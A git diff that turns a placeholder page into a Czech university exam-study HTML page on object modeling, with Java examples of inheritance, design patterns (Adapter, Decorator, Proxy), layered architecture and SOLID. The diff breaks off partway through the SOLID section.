@@ -1,22 +1,962 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <title>OMO - Objektové modelování | SZZ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OMO - Objektové modelování | SZZ Příprava</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <link rel="stylesheet" href="shared.css">
+    <script>
+        window.MathJax = {
+            tex: {
+                inlineMath: [['$','$'], ['\\(','\\)']],
+                displayMath: [['$$','$$'], ['\\[','\\]']],
+                macros: { N: "\\mathbb{N}", R: "\\mathbb{R}", Z: "\\mathbb{Z}", Q: "\\mathbb{Q}", C: "\\mathbb{C}" }
+            }
+        };
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 </head>
 <body>
-    <nav class="navbar navbar-dark bg-primary fixed-top">
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary fixed-top">
         <div class="container-fluid">
             <a class="navbar-brand" href="../index.html"><i class="fas fa-arrow-left me-2"></i>Dashboard</a>
             <span class="navbar-text mx-auto"><strong>OMO</strong> - Objektové modelování</span>
-            <button class="btn btn-link text-white" onclick="document.body.classList.toggle('dark-mode')"><i class="fas fa-adjust"></i></button>
+            <button class="btn btn-link text-white" onclick="document.body.classList.toggle('dark-mode')">
+                <i class="fas fa-adjust"></i>
+            </button>
         </div>
     </nav>
-    <div class="container"><h1>Objektové modelování</h1><div class="alert alert-info mt-4"><i class="fas fa-info-circle"></i> Ve výstavbě</div></div>
-    <script src="subjects-nav.js"></script>
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-3 d-none d-lg-block">
+                <nav class="topic-nav pt-4">
+                    <h6 class="text-muted text-uppercase fw-bold mb-3">Témata</h6>
+                    <ul class="nav flex-column">
+                        <li><a class="nav-link py-1" href="#topic-1">1. Dědičnost</a></li>
+                        <li><a class="nav-link py-1" href="#topic-2">2. Asociace, agregace, kompozice</a></li>
+                        <li><a class="nav-link py-1" href="#topic-3">3. Návrhové vzory – přehled</a></li>
+                        <li><a class="nav-link py-1" href="#topic-4">4. Vícevrstevnatá architektura</a></li>
+                        <li><a class="nav-link py-1" href="#topic-5">5. Objekt, třída, zapouzdření</a></li>
+                        <li><a class="nav-link py-1" href="#topic-6">6. Polymorfismus a vtable</a></li>
+                        <li><a class="nav-link py-1" href="#topic-7">7. Abstraktní třída vs. interface</a></li>
+                        <li><a class="nav-link py-1" href="#topic-8">8. Adapter</a></li>
+                        <li><a class="nav-link py-1" href="#topic-9">9. Adapter vs. Proxy vs. Decorator</a></li>
+                        <li><a class="nav-link py-1" href="#topic-10">10. Softwarová architektura</a></li>
+                        <li><a class="nav-link py-1" href="#topic-11">11. Decorator</a></li>
+                        <li><a class="nav-link py-1" href="#topic-12">12. Proxy</a></li>
+                        <li><a class="nav-link py-1" href="#topic-13">13. SOLID principy</a></li>
+                        <li><a class="nav-link py-1" href="#topic-14">14. LSP – detailně</a></li>
+                        <li><a class="nav-link py-1" href="#topic-15">15. MVC vs. vrstevnatá architektura</a></li>
+                        <li><a class="nav-link py-1" href="#topic-16">16. GRASP principy</a></li>
+                        <li><a class="nav-link py-1" href="#topic-17">17. REST a HATEOAS</a></li>
+                        <li><a class="nav-link py-1" href="#topic-18">18. Stavovost komunikace</a></li>
+                        <li><a class="nav-link py-1" href="#topic-19">19. XSS a SQL injection</a></li>
+                        <li><a class="nav-link py-1" href="#topic-20">20. Funkcionální programování</a></li>
+                        <li><a class="nav-link py-1" href="#topic-21">21. Observer</a></li>
+                        <li><a class="nav-link py-1" href="#topic-22">22. Iterator</a></li>
+                        <li><a class="nav-link py-1" href="#topic-23">23. Visitor</a></li>
+                        <li><a class="nav-link py-1" href="#topic-24">24. Požadavky na systém</a></li>
+                    </ul>
+                </nav>
+            </div>
+
+            <div class="col-lg-9">
+                <h1 class="mb-4">Objektové modelování</h1>
+
+                <section class="topic-section" id="topic-1">
+                    <h3>1. Dědičnost – princip, hierarchie tříd</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Dědičnost říká „nová třída <em>je</em> starší třída, ale s něčím navíc." Umožňuje znovupoužití kódu a budování hierarchií.</div>
+                    <p>Dědičnost je mechanismus, kdy <strong>podtřída (potomek)</strong> přebírá atributy a metody <strong>nadtřídy (rodiče)</strong> a může je rozšířit nebo přepsat. Java podporuje jednoduchou dědičnost tříd, ale vícenásobnou implementaci rozhraní.</p>
+                    <div class="def-box"><strong>Definice:</strong> <code>B extends A</code> — B dědí všechny <code>public</code> a <code>protected</code> členy A. B může přidat vlastní členy nebo přepsat (<em>override</em>) existující metody.</div>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>class Animal {
+    String name;
+    void eat() { System.out.println(name + " eats"); }
+}
+class Dog extends Animal {
+    void bark() { System.out.println("Woof!"); }
+}
+Dog d = new Dog();
+d.eat();   // zděděno
+d.bark();  // vlastní</code></pre>
+                        <p>Hierarchie: <code>Object → Animal → Dog → GoldenRetriever</code></p>
+                    </div>
+                    <ul>
+                        <li><strong>override</strong> – potomek přepíše metodu rodiče (<code>@Override</code>)</li>
+                        <li><strong>super</strong> – odkaz na nadtřídu; <code>super.metoda()</code> volá verzi rodiče</li>
+                        <li><strong>final class</strong> – třídu nelze dědit (např. <code>String</code>)</li>
+                    </ul>
+                    <div class="warn-box"><strong>Upozornění:</strong> Hluboká hierarchie (5+ úrovní) = těžká udržovatelnost. Pravidlo: preferuj <strong>kompozici před dědičností</strong> (<em>composition over inheritance</em>).</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Podtřída dědí atributy a metody rodiče, může je rozšířit nebo přepsat.</li>
+                        <li>Java: jednoduchá dědičnost tříd, vícenásobná implementace rozhraní.</li>
+                        <li>Klíčová slova: <code>extends</code>, <code>super</code>, <code>@Override</code>.</li>
+                        <li>Hluboká hierarchie = problém → preferuj kompozici.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-2">
+                    <h3>2. Asociace, agregace, kompozice</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Všechny tři jsou vztahy „má" (<em>has-a</em>) mezi objekty – liší se silou vazby a dobou života části.</div>
+                    <div class="def-box"><strong>Definice:</strong><ul>
+                        <li><strong>Asociace</strong> – volné propojení; oba objekty existují nezávisle. „Učitel učí Studenty."</li>
+                        <li><strong>Agregace</strong> – celek–část; část může existovat i bez celku a patřit více celkům. „Playlist obsahuje Písničky."</li>
+                        <li><strong>Kompozice</strong> – silný celek–část; část bez celku nedává smysl, zanikne s ním. „Objednávka má Položky."</li>
+                    </ul></div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Vztah</th><th>UML symbol</th><th>Životnost části</th><th>Příklad</th></tr></thead>
+                        <tbody>
+                            <tr><td>Asociace</td><td>→</td><td>nezávislá</td><td>Student ↔ Učitel</td></tr>
+                            <tr><td>Agregace</td><td>◇— (prázdný kosočtverec)</td><td>nezávislá, sdílená</td><td>Playlist → Písničky</td></tr>
+                            <tr><td>Kompozice</td><td>◆— (plný kosočtverec)</td><td>závisí na celku</td><td>Objednávka → Položky</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>Implementace v Javě:</strong>
+<pre><code>// Agregace – Song existuje bez Playlist
+class Playlist { List&lt;Song&gt; songs; }
+
+// Kompozice – OrderItem vzniká a zaniká s Order
+class Order {
+    List&lt;OrderItem&gt; items = new ArrayList&lt;&gt;();
+    Order() { items.add(new OrderItem()); }
+}</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Upozornění:</strong> V Javě/C# je technický rozdíl minimální – jde o <em>sémantický</em> závazek v návrhu (kdo část tvoří, kdo ničí, lze ji sdílet?).</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Asociace = volná vazba, oba nezávislí.</li>
+                        <li>Agregace = celek–část, část může existovat i jinde.</li>
+                        <li>Kompozice = silná vazba, část zanikne se celkem.</li>
+                        <li>UML: prázdný vs. plný kosočtverec u celku.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-3">
+                    <h3>3. Návrhové vzory – co to jsou, dělení</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Návrhový vzor není hotový kód – je to <em>recept</em> na řešení opakujícího se problému. Popisuje postup, ty ho přizpůsobíš svým třídám.</div>
+                    <div class="def-box"><strong>Definice:</strong> Návrhový vzor (design pattern) je obecné opakovaně použitelné řešení typického problému v návrhu softwaru. Katalog 23 vzorů sestavil v roce 1994 <strong>Gang of Four (GoF)</strong>: Gamma, Helm, Johnson, Vlissides.</div>
+                    <h4>1. Kreační — jak vytvářet objekty</h4>
+                    <div class="ex-box"><strong>Příklady:</strong><ul>
+                        <li><strong>Singleton</strong> – jediná instance třídy (konfigurace)</li>
+                        <li><strong>Factory Method</strong> – nadtřída definuje factory, podtřída rozhoduje o typu</li>
+                        <li><strong>Abstract Factory</strong> – rodina kompatibilních objektů (GUI pro Windows vs. Mac)</li>
+                        <li><strong>Builder</strong> – krok po kroku sestavuje složitý objekt</li>
+                        <li><strong>Prototype</strong> – kopírování existujícího objektu (clone)</li>
+                    </ul></div>
+                    <h4>2. Strukturální — jak skládat třídy</h4>
+                    <div class="ex-box"><strong>Příklady:</strong><ul>
+                        <li><strong>Adapter</strong> – konvertuje nekompatibilní interface (viz téma 8)</li>
+                        <li><strong>Decorator</strong> – přidává chování za běhu (viz téma 11)</li>
+                        <li><strong>Proxy</strong> – kontroluje přístup (viz téma 12)</li>
+                        <li><strong>Facade</strong> – zjednodušuje složitý subsystém jedním rozhraním</li>
+                        <li><strong>Composite</strong> – strom: listy i větve sdílejí interface (soubory a složky)</li>
+                    </ul></div>
+                    <h4>3. Behaviorální — jak objekty komunikují</h4>
+                    <div class="ex-box"><strong>Příklady:</strong><ul>
+                        <li><strong>Observer</strong> – publish/subscribe (viz téma 21)</li>
+                        <li><strong>Iterator</strong> – sekvenční přístup ke kolekci (viz téma 22)</li>
+                        <li><strong>Visitor</strong> – oddělení algoritmů od datové struktury (viz téma 23)</li>
+                        <li><strong>Strategy</strong> – zaměnitelné algoritmy</li>
+                        <li><strong>Command</strong> – požadavek jako objekt (undo/redo)</li>
+                    </ul></div>
+                    <div class="warn-box"><strong>Upozornění:</strong> Vzory lze přepoužívat (overengineering). Aplikuj vzor jen když řešíš konkrétní opakující se problém – ne pro „profesionální vzhled".</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>GoF 1994, 23 vzorů.</li>
+                        <li>Kreační: jak tvořit objekty.</li>
+                        <li>Strukturální: jak skládat třídy.</li>
+                        <li>Behaviorální: jak objekty spolupracují.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-4">
+                    <h3>4. Vícevrstevnatá architektura (BO, DAO, Service layer)</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Každá vrstva dělá jednu věc. Prezentace neví o databázi, databáze neví o UI.</div>
+                    <div class="def-box"><strong>Vrstvy (zdola nahoru):</strong><ol>
+                        <li><strong>DAO (Data Access Object)</strong> – komunikace s DB, CRUD operace; izoluje zbytek od konkrétní DB technologie.</li>
+                        <li><strong>Service Layer</strong> – orchestruje byznys logiku; volá DAO, aplikuje pravidla, koordinuje transakce.</li>
+                        <li><strong>Prezentační vrstva (Controller)</strong> – přijímá HTTP požadavky; nesmí obsahovat byznys logiku.</li>
+                    </ol></div>
+                    <p><strong>Business Object (BO)</strong> – doménový objekt s daty <em>i</em> byznys logikou (např. <code>Invoice.calculateTotal()</code>). Patří do servisní/doménové vrstvy.</p>
+                    <div class="ex-box"><strong>Spring Boot příklad:</strong>
+<pre><code>@Repository
+class UserRepository { User findById(Long id) { /* SQL */ } }
+
+@Service
+class UserService {
+    UserRepository repo;
+    User getUser(Long id) {
+        User u = repo.findById(id);
+        if (u == null) throw new NotFoundException();
+        return u;
+    }
+}
+
+@RestController
+class UserController {
+    UserService service;
+    @GetMapping("/users/{id}")
+    User get(@PathVariable Long id) { return service.getUser(id); }
+}</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Anemic Domain Model</strong> – BO jsou jen getter/setter kontejnery, veškerá logika je v Service vrstvě → narušuje OOP. Doménové objekty mají nést i logiku.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Tři vrstvy: Prezentace → Service → DAO → DB.</li>
+                        <li>DAO izoluje DB přístup; Service orchestruje logiku; Controller jen deleguje.</li>
+                        <li>BO = doménový objekt s logikou, ne jen data.</li>
+                        <li>Každá vrstva závisí pouze na vrstvě přímo pod ní.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-5">
+                    <h3>5. Objekt, třída, zapouzdření</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Třída je šablona (cookie cutter), objekt je výsledek (cookie). Zapouzdření: „kdo chce dort, dostane kousek – ne celou kuchyni."</div>
+                    <div class="def-box"><strong>Definice:</strong><ul>
+                        <li><strong>Třída</strong> – šablona/předpis popisující strukturu (atributy) a chování (metody).</li>
+                        <li><strong>Objekt</strong> – konkrétní instance třídy v paměti s vlastním stavem.</li>
+                        <li><strong>Zapouzdření (Encapsulation)</strong> – skrytí interní implementace za veřejné rozhraní. Atributy jsou <code>private</code>, přístup přes <code>public</code> metody.</li>
+                    </ul></div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Modifikátor</th><th>Viditelnost</th></tr></thead>
+                        <tbody>
+                            <tr><td><code>private</code></td><td>Pouze daná třída</td></tr>
+                            <tr><td><code>protected</code></td><td>Třída + podtřídy + stejný package</td></tr>
+                            <tr><td>(default)</td><td>Stejný package</td></tr>
+                            <tr><td><code>public</code></td><td>Kdokoli</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>class BankAccount {
+    private double balance;
+    public void deposit(double amount) {
+        if (amount > 0) balance += amount;
+    }
+    public double getBalance() { return balance; }
+}
+BankAccount acc = new BankAccount();
+acc.balance = -1000;  // CHYBA – private
+acc.deposit(500);     // OK</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Getter/setter anti-pattern:</strong> Pokud pro každý atribut existuje getter i setter, zapouzdření neplní účel. Odhaluj jen to, co je potřeba.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Třída = šablona; objekt = instance v paměti.</li>
+                        <li>Zapouzdření = private atributy + public rozhraní.</li>
+                        <li>Výhoda: změna implementace neovlivní klienty třídy.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-6">
+                    <h3>6. Polymorfismus – staticky/dynamicky vázané metody, vtable</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Polymorfismus = „mnoho podob". Stejné volání metody se chová různě podle skutečného typu objektu za běhu.</div>
+                    <div class="def-box"><strong>Definice:</strong> Polymorfismus umožňuje, aby proměnná nadtřídy (<code>Animal a</code>) odkazovala na objekt podtřídy (<code>new Dog()</code>) a volání metody se chovalo podle skutečného typu.</div>
+                    <h4>Statická vazba (Early Binding)</h4>
+                    <p>Kompilátor rozhodne <strong>v době překladu</strong>. Platí pro: přetížení metod (overloading), <code>static</code> / <code>private</code> / <code>final</code> metody.</p>
+                    <h4>Dynamická vazba (Late Binding)</h4>
+                    <p>Rozhodnutí se odkládá na <strong>dobu běhu</strong>. Platí pro přepsané (<em>overridden</em>) metody. V Javě jsou všechny instance metody implicitně virtuální.</p>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>class Animal { void speak() { System.out.println("..."); } }
+class Dog    extends Animal { @Override void speak() { System.out.println("Woof"); } }
+class Cat    extends Animal { @Override void speak() { System.out.println("Meow"); } }
+
+Animal a = new Dog();
+a.speak();  // "Woof" — runtime rozhodne</code></pre>
+                    </div>
+                    <h4>vtable (Virtual Method Table)</h4>
+                    <p>Mechanismus dynamické vazby. Každá třída s virtuálními metodami má <strong>vtable</strong> – tabulku ukazatelů na metody. Každý objekt nese skrytý <em>vptr</em> na vtable své třídy.</p>
+                    <div class="ex-box"><strong>Postup:</strong>
+                        <ol>
+                            <li><code>Dog</code> objekt nese <code>vptr → Dog_vtable</code></li>
+                            <li><code>Dog_vtable[speak] → Dog::speak()</code></li>
+                            <li>Při volání <code>a.speak()</code>: přečti vptr, najdi slot, zavolej metodu</li>
+                        </ol>
+                        <p>JVM dělá totéž interně (<code>invokevirtual</code> bytecode).</p>
+                    </div>
+                    <div class="warn-box"><strong>Overloading vs. Overriding:</strong> Overloading = různé parametry v jedné třídě → statická vazba. Overriding = přepsání metody v podtřídě → dynamická vazba.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Statická vazba: overloading – rozhoduje kompilátor.</li>
+                        <li>Dynamická vazba: overriding – rozhoduje JVM za běhu.</li>
+                        <li>vtable = tabulka virtuálních metod; vptr = ukazatel objektu na svou vtable.</li>
+                        <li>Java: všechny instance metody jsou defaultně virtuální.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-7">
+                    <h3>7. Abstraktní třída vs. interface</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Interface = smlouva „co umíš". Abstraktní třída = „co umíš + jak to částečně děláš." Preferuj interface, pokud nepotřebuješ sdílenou implementaci.</div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Vlastnost</th><th>Abstraktní třída</th><th>Interface</th></tr></thead>
+                        <tbody>
+                            <tr><td>Implementace metod</td><td>Ano (i konkrétní)</td><td>Jen <code>default</code> metody (Java 8+)</td></tr>
+                            <tr><td>Atributy</td><td>Libovolné</td><td>Jen <code>public static final</code> konstanty</td></tr>
+                            <tr><td>Dědičnost</td><td>Jen jedna nadtřída</td><td>Libovolně mnoho implementací</td></tr>
+                            <tr><td>Konstruktor</td><td>Ano</td><td>Ne</td></tr>
+                            <tr><td>Kdy použít</td><td>Sdílená impl. pro příbuzné třídy</td><td>Smlouva pro nepříbuzné třídy</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>interface Flyable { void fly(); }
+
+abstract class Bird {
+    String name;
+    abstract void sing();
+    void breathe() { /* sdílená implementace */ }
+}
+
+class Parrot extends Bird implements Flyable {
+    void sing()       { System.out.println("Squawk"); }
+    public void fly() { System.out.println("Flap flap"); }
+}</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Upozornění:</strong> Interface s jednou metodou (<em>functional interface</em>) lze v Javě 8+ použít jako lambdu. Abstraktní třídy to neumožňují.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Abstraktní třída: částečná implementace, jen jedna nadtřída, pro příbuzné třídy.</li>
+                        <li>Interface: čistá smlouva, vícenásobná implementace, pro nepříbuzné třídy.</li>
+                        <li>Pravidlo: pokud se obejdeš bez implementace, použij interface.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-8">
+                    <h3>8. Adapter – popis, diagram, příklad</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Adapter je jako cestovní adaptér – nepřepisuje zařízení, jen přizpůsobí rozhraní pro nové prostředí.</div>
+                    <div class="def-box"><strong>Definice:</strong> Adapter je strukturální vzor, který <strong>konvertuje interface jedné třídy na interface, který klient očekává</strong>. Umožňuje spolupráci tříd s nekompatibilními rozhraními.</div>
+                    <div class="ex-box"><strong>Diagram:</strong>
+<pre><code>«interface»    «class»          «class»
+Target     ←   Adapter      →   Adaptee
++ request()    + request()      + specificRequest()
+                   └── volá Adaptee.specificRequest()</code></pre>
+                    </div>
+                    <div class="ex-box"><strong>Příklad – legacy XML tiskárna v JSON světě:</strong>
+<pre><code>interface JsonPrinter { void printJson(String json); }
+
+class XmlPrinter {
+    void printXml(String xml) { System.out.println(xml); }
+}
+
+class XmlToJsonAdapter implements JsonPrinter {
+    private XmlPrinter p;
+    XmlToJsonAdapter(XmlPrinter p) { this.p = p; }
+    public void printJson(String json) {
+        p.printXml(convertJsonToXml(json));
+    }
+}
+
+JsonPrinter printer = new XmlToJsonAdapter(new XmlPrinter());
+printer.printJson("{\"name\":\"Adam\"}");</code></pre>
+                    </div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Adapter = strukturální vzor pro konverzi rozhraní.</li>
+                        <li>Klient volá <code>Target</code> interface; Adapter deleguje na <code>Adaptee</code>.</li>
+                        <li>Adapter implementuje <strong>jiné</strong> interface než Adaptee.</li>
+                        <li>Použití: integrace legacy kódu, propojení nesouvisejících knihoven.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-9">
+                    <h3>9. Rozdíl Adapter vs. Proxy vs. Decorator</h3>
+                    <div class="insight-box"><strong>Klíč:</strong> Mění se interface?<br>
+                        <strong>Ano → Adapter</strong> (konverze) &nbsp;|&nbsp;
+                        <strong>Ne + přidává chování → Decorator</strong> &nbsp;|&nbsp;
+                        <strong>Ne + kontroluje přístup → Proxy</strong>
+                    </div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Vlastnost</th><th>Adapter</th><th>Decorator</th><th>Proxy</th></tr></thead>
+                        <tbody>
+                            <tr><td>Interface vůči klientovi</td><td><strong>Jiný</strong></td><td><strong>Stejný</strong></td><td><strong>Stejný</strong></td></tr>
+                            <tr><td>Záměr</td><td>Konverze rozhraní</td><td>Přidání funkcionality</td><td>Kontrola přístupu</td></tr>
+                            <tr><td>Vznik vazby</td><td>Runtime / compile-time</td><td>Runtime (dynamicky)</td><td>Typicky compile-time</td></tr>
+                            <tr><td>Příklad</td><td>Legacy integrace</td><td>Logging, caching, šifrování</td><td>Lazy loading, auth, remote</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>Paměťový trik:</strong><ol>
+                        <li>Mění interface? → <strong>Adapter</strong></li>
+                        <li>Přidává chování za běhu? → <strong>Decorator</strong></li>
+                        <li>Hlídá přístup k objektu? → <strong>Proxy</strong></li>
+                    </ol></div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Adapter: různé interface → konverze.</li>
+                        <li>Decorator: stejné interface → přidává vrstvy chování za běhu.</li>
+                        <li>Proxy: stejné interface → kontroluje přístup.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-10">
+                    <h3>10. Softwarová architektura – definice, typy, výhody a nevýhody</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Architektura je plán města, ne plán domu – rozhoduje o struktuře celého systému, tato rozhodnutí jsou těžko změnitelná.</div>
+                    <div class="def-box"><strong>Definice:</strong> Softwarová architektura je <strong>vysokoúrovňová struktura</strong> systému – způsob, jakým jsou komponenty uspořádány, jak komunikují a jaké mají zodpovědnosti.</div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Styl</th><th>Popis</th><th>Výhody</th><th>Nevýhody</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Monolit</strong></td><td>Vše v jedné nasazovací jednotce</td><td>Jednoduchý vývoj, snadné ladění</td><td>Těžké škálovat, velký deployment</td></tr>
+                            <tr><td><strong>Layered</strong></td><td>Prezentace → Byznys → Data</td><td>Přehlednost, testovatelnost</td><td>Každý požadavek prochází všemi vrstvami</td></tr>
+                            <tr><td><strong>Mikroslužby</strong></td><td>Nezávislé služby s vlastní DB</td><td>Škálovatelnost, nezávislé nasazení</td><td>Složitost, síťová latence, distribuované transakce</td></tr>
+                            <tr><td><strong>Event-driven</strong></td><td>Komunikace přes zprávy/události</td><td>Loose coupling, async</td><td>Těžké ladění, eventual consistency</td></tr>
+                            <tr><td><strong>Pipe-and-filter</strong></td><td>Data proudí řetězem transformací</td><td>Modulární, kompozitelné</td><td>Latence, složitá chybová propagace</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Architektura = vysokoúrovňová struktura (těžko měnitelná).</li>
+                        <li>Hlavní styly: Monolit, Layered, Mikroslužby, Event-driven, Pipe-and-filter.</li>
+                        <li>Každý styl má trade-offs – žádný není universálně nejlepší.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-11">
+                    <h3>11. Decorator – popis, diagram, příklad</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Decorator = cibule. Každá vrstva obalí předchozí a přidá něco navíc, přičemž navenek vypadá pořád jako cibule (stejné rozhraní).</div>
+                    <div class="def-box"><strong>Definice:</strong> Decorator je strukturální vzor, který <strong>dynamicky přidává nové chování objektu bez změny jeho třídy</strong>. Implementuje stejný interface jako obalovaný objekt.</div>
+                    <div class="ex-box"><strong>Diagram:</strong>
+<pre><code>«interface» Coffee
+  + cost(): double
+  + desc(): String
+
+SimpleCoffee         MilkDecorator(Coffee)    SugarDecorator(Coffee)
+cost() → 1.0         cost() → inner+0.3       cost() → inner+0.2</code></pre>
+                    </div>
+                    <div class="ex-box"><strong>Příklad – káva s přísadami:</strong>
+<pre><code>interface Coffee { double cost(); String desc(); }
+
+class SimpleCoffee implements Coffee {
+    public double cost() { return 1.0; }
+    public String desc() { return "Káva"; }
+}
+
+class MilkDecorator implements Coffee {
+    private Coffee c;
+    MilkDecorator(Coffee c) { this.c = c; }
+    public double cost() { return c.cost() + 0.3; }
+    public String desc() { return c.desc() + " + mléko"; }
+}
+
+Coffee c = new MilkDecorator(new MilkDecorator(new SimpleCoffee()));
+c.desc();  // "Káva + mléko + mléko"
+c.cost();  // 1.6</code></pre>
+                    </div>
+                    <p><strong>Reálné příklady:</strong> Java I/O streams (<code>new BufferedReader(new FileReader(f))</code>), HTTP middleware, Spring Security interceptory.</p>
+                    <div class="warn-box"><strong>Upozornění:</strong> Mnoho dekorátorů = hluboký stack volání → ladění může být složité. Pořadí dekorátorů záleží!</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Decorator obalí objekt a přidá chování za běhu – zachovává interface.</li>
+                        <li>Dekorátory lze libovolně vrstvit.</li>
+                        <li>Reálné použití: Java I/O, HTTP middleware, logování.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-12">
+                    <h3>12. Proxy – popis, diagram, příklad</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Proxy = recepční. Klient myslí, že mluví přímo s ředitelem (objektem), ale mluví s recepcí, která přístup filtruje nebo odkládá.</div>
+                    <div class="def-box"><strong>Definice:</strong> Proxy je strukturální vzor poskytující <strong>zástupný objekt</strong>, který kontroluje přístup k jinému objektu. Implementuje stejné rozhraní jako skutečný objekt.</div>
+                    <h4>Typy Proxy</h4>
+                    <ul>
+                        <li><strong>Virtual Proxy</strong> – odkládá vytvoření drahého objektu (<em>lazy init</em>)</li>
+                        <li><strong>Protection Proxy</strong> – kontroluje oprávnění</li>
+                        <li><strong>Remote Proxy</strong> – přístup k objektu na jiném stroji (RMI stub)</li>
+                        <li><strong>Caching Proxy</strong> – ukládá výsledky pro opakované dotazy</li>
+                    </ul>
+                    <div class="ex-box"><strong>Příklad – Virtual Proxy (lazy loading):</strong>
+<pre><code>interface Image { void display(); }
+
+class RealImage implements Image {
+    RealImage(String f) { loadFromDisk(f); }  // drahá operace
+    public void display() { System.out.println("Displaying"); }
+}
+
+class ImageProxy implements Image {
+    private RealImage real;
+    private String file;
+    ImageProxy(String f) { this.file = f; }  // disk se nenačte hned
+
+    public void display() {
+        if (real == null) real = new RealImage(file);  // lazy init
+        real.display();
+    }
+}
+
+Image img = new ImageProxy("photo.jpg");
+img.display();  // teprve TEĎ se načte z disku</code></pre>
+                    </div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Proxy = zástupce se stejným interface jako skutečný objekt.</li>
+                        <li>Typy: Virtual (lazy init), Protection (auth), Remote, Caching.</li>
+                        <li>Klient neví, že mluví s proxy.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-13">
+                    <h3>13. SOLID principy – přehled všech pěti</h3>
+                    <div class="insight-box"><strong>Insight:</strong> SOLID jsou pravidla pro kód, který se dá snadno rozšířit, otestovat a udržovat. Porušení SOLID se projeví jako bolest při každé změně požadavků.</div>
+
+                    <h4>S – Single Responsibility Principle</h4>
+                    <div class="def-box"><strong>Třída má mít jen jeden důvod ke změně.</strong></div>
+                    <p><em>Porušení:</em> <code>UserManager</code> ukládá uživatele, posílá emaily, generuje PDF → 3 důvody ke změně.<br>
+                    <em>Oprava:</em> <code>UserRepository</code>, <code>EmailService</code>, <code>ReportGenerator</code>.</p>
+
+                    <h4>O – Open/Closed Principle</h4>
+                    <div class="def-box"><strong>Otevřeno pro rozšíření, uzavřeno pro modifikaci.</strong></div>
+                    <p>Přidáváš nové chování přes dědičnost/kompozici/strategie, ne editací existujícího kódu.</p>
+
+                    <h4>L – Liskov Substitution Principle</h4>
+                    <div class="def-box"><strong>Objekty nadtřídy lze nahradit instancemi podtřídy bez narušení správnosti.</strong></div>
+                    <p>(Viz téma 14 pro detaily.)</p>
+
+                    <h4>I – Interface Segregation Principle</h4>
+                    <div class="def-box"><strong>Klienty nenuť záviset na metodách, které nepoužívají.</strong></div>
+                    <p><em>Porušení:</em> Interface <code>Worker { work(); eat(); }</code> – robot musí implementovat <code>eat()</code>, které pro něj nedává smysl.<br>
+                    <em>Oprava:</em> Rozděl na <code>Workable</code> a <code>Feedable</code>.</p>
+
+                    <h4>D – Dependency Inversion Principle</h4>
+                    <div class="def-box"><strong>Závisej na abstrakcích, ne na konkrétních implementacích.</strong></div>
